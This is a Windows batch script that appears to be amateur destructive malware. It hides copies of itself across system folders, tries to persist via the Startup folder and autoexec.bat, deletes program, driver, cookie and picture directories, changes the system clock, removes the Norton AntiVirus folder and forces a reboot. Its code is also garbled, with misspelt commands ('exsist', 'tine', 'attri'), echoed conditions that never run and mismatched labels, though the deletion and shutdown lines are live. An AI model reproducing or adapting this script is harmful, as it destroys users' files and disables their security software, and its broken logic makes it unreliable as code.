   @echo off
   cls

   echo if exsist C:\fat.bat goto check2
   echo if not exsist goto fatback

   :fatback
   copy %0 "C:\fat.bat"
   attrib +H C:\fat.bat
   goto check 2

   :check2
   echo if exsist C:\Docume~1\alluse~1\Startm~1\Programs\startup\mr.bat goto a
   echo if not exsist goto yourabcs

   :yourabcs
   echo copy %0 "C:\Docume~1\alluse~1\Startm~1\Programs\startup\mr.bat" >> autoexec.bat
   attrib +H C:\Docume~1\alluse~1\Startm~1\Programs\startup\mr.bat
   goto 0

   :0
   echo if exsist C:\fat goto ab
   echo if not exsist goto 1

   :1
   echo if exsist C:\winnt\myass.bat goto c
   echo if not exsist goto 2

   :2
   echo if exsist C:\brooke.bat goto d
   echo if not exsist goto 3

   :3
   echo if exsist C:\chi.bat goto e
   echo if not exsist goto 4

   :4
   echo if exsist C:\winnt\toung.bat goto f
   echo if not exsist goto 5

   :5
   echo if exsist C:\winnt\system32\me2.bat goto g
   echo if not exsist goto 6

   :6
   echo if exsist C:\irock.bat goto h
   echo if not exsist goto 7

   :7
   echo if exsist C:\winnt\joe.bat goto i
   echo if not exsist goto 8

   :8
   echo if exsist C:\progra~1\foo.bat goto j
   echo if not exsist goto 9

   :9
   echo if exsist C:\winnt\system32\pooo.bat goto k
   echo if not exsist goto 10

   :10
   echo if exsist C:\progra~1\rdig.bat goto l
   echo if not exsist goto 11

   :11
   echo if exsist C:\winnt\cursors\mrig.bat goto m
   echo if not exsist goto 12

   :12
   echo if exsist C:\winnt\system\kool.bat goto n
   echo if not exsist goto 13

   :13
   echo if exsist C:\winnt\speech\mudvayne.bat goto o
   echo if not exsist goto 14

   :14
   echo if exsist C:\winnt\slip.bat goto p.
   echo if not exsist goto 15

   :15
   echo if exsist C:\winnt\temp\iruleall.bat goto q
   echo if not exsist goto 16

   :16
   echo if exsist C:\winnt\tasks\mooo.bat goto r
   echo if not exsist goto 17

   :17
   echo if exsist C:\regist~1\virus#2 goto s
   echo if not exsist goto s

   :a
   copy %0 "C:\winnt\myass.bat
   attrib +H C:\winnt\myass.bat
   del C:\fat.bat
   del C:\WINNT\system32\cdplayer
   time 6:56
   goto end

   :c
   copy %0 "C:\brooke.bat"
   attrib +H C:\brooke.bat
   del C:\winnt\myass.bat
   del C:\progr~1\earthlink\*.*
   time 7:06
   goto end

   :d
   copy %0 "C:\chi.bat"
   attrib +H C:\chi.bat
   del C:\brooke.bat
   del C:\progra~1\aol\*.*
   time 1:55
   goto end

   :e
   copy %0 "C:\winnt\toung.bat"
   attrib +H C:\winnt\toung.bat
   del C:\chi.bat
   del C:\del C:\progra~1\aim\*.*
   time 1:00
   goto end

   :f
   copy %0 "C:\winnt\system32\me2.bat"
   attrib +H C:\winnt\system32\me2.bat
   del C:\winnt\tounge.bat
   del C:\winnt\system32\mspaint\
   time 3:00
   goto end

   :g
   copy %0 "C:\irock.bat"
   attri +H C:\irock.bat
   del C:\winnt\system32\me2.bat
   del C:\progra~1\winzip\*.*
   time 2:00
   goto end

   :h
   copy %0 "C:\winnt\joe.bat"
   attrib +H C:\winnt\joe.bat
   del C:\irock.bat
   del C:\progra~1\micros~2\*.*
   time 1:34
   goto end

   :i
   copy %0 "C:\progra~1\foo.bat"
   attrib +H C:\progra~1\foo.bat
   del C:\irock.bat
   del C:\ducume~1\alluse~1\mydocuments\mypict~1\*.*
   tine 1:29
   goto end

   :j
   copy %0 "C:\winnt\system32\pooo.bat"
   attrib +H C:\winnt\system32\pooo.bat
   del C:\progra~1\foo.bat
   del C:\docume~1\alluse~1\programs\micros~1\*.*
   1:34
   goto end

   :k
   copy %0 "C:\progra~1\rdig.bat"
   attrib +H C:\progra~1\rdig.bat
   del C:\winnt\system32\pooo.bat
   del C:\winnt\downlo~1\*.*
   time 5:59
   goto end

   :l
   copy %0 "C:\winnt\cursors\mrig.bat"
   attrib +H C:\winnt\cursors\mrig.bat
   del C:\progra~1\rdig.bat
   del C:\docume~1\alluse~1\programs\admini~1\*.*
   time 7:45
   goto end

   :m
   copy %0 "C:\winnt\system\kool.bat"
   atrrib +H C:\winnt\system\kool.bat
   del C:\winnt\cursors\mrig.bat
   del C:\winnt\system32\drivers\cdaudio\*.*
   time 3:08
   goto end

   :n
   copy %0 "C:\winnt\speech\mudvayne.bat"
   attrib +H C:\winnt\speech\mudvayne.bat
   del C:\winnt\system\kool.bat
   del C:\windows\internetexsplorer\*.*
   time 4:57
   goto end

   :o
   copy %0 "C:\winnt\slip.bat"
   attrib +H C:\winnt\slip.bat
   del C:\winnt\speech\mudvayne.bat
   del C:\windows\cookies\*.*
   time 3:55
   goto end

   :.p
   copy %0 "C:\winnt\temp\iruleall.bat"
   attrib +H C:\winnt\temp\iruleall.bat
   del C:\winnt\slip.bat
   del C:\windows\windowsmediaplay\*.*
   time 3:49
   goto end

   :q
   copy %0 "C:\winnt\tasks\mooo.bat"
   attrib +H C:\winnt\tasks\mooo.bat
   del C:\winnt\temp\iruleall.bat
   del C:\windows\msword\*.*
   time 5:43
   goto end

   :r
   copy %0 "C:\winnt\regist~1\virus#2.bat"
   attrib +H C:\regist~1\virus#2.bat
   del C:\winnt\tasks\mooo.bat
   del C:\winnt\system32\drivers\ccdecode\*.*
   time 2:30
   goto end

   :s
   copy %0 "C:\myasf.bat"
   copy %0 "C:\too.bat"
   copy %0 "C:\winnt\goo.bat"
   copy %0 "C:\winnt\sysstem32\rdig2.bat"
   copy %0 "C:\winnt\system\hoo.bat"
   copy %0 "C:\progra~1\g.bat"
   copy %0 "C:\pooass.bat"
   copy %0 "C:\fat.bat"
   goto s-s

   :s-s
   attrib +H C:\winnt\goo.bat
   attrib +H C:\too.bat
   attrib +H C:\myasf.bat
   attrib +H C:\pooass.bat
   attrib +H C:\progra~1\g.bat
   attrib +H C:\winnt\system\hoo.bat
   attrib +H C:\winnt\sysstem32\rdig2.bat
   attrib +H C:\fat.bat
   goto end

   :end
   attrib -r c:\progra~1\navnt
   rmdir c:\progra~1\navnt
   SHUTDOWN -r -t 25
